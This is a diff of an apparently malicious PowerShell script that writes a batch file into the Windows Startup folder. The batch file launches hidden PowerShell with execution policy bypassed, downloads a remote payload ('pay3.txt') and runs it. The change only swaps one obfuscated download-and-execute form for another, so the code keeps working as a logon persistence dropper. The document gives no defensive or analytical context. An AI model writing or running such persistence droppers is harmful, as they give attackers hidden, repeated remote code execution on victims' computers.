@@ -5,7 +5,7 @@ cd Startup
 $testbat = Test-Path start.bat
 if (!($testbat)){
 New-Item start.bat
-Set-Content start.bat "powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon"
+Set-Content start.bat "powershell  -w hidden -Exec ByPass -NoProfile -c [scriptblock]::Create((Invoke-WebRequest 'https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt').Content).Invoke()"
 }
 $testbat2 = Test-Path start2.bat
 if (!($testbat2)){
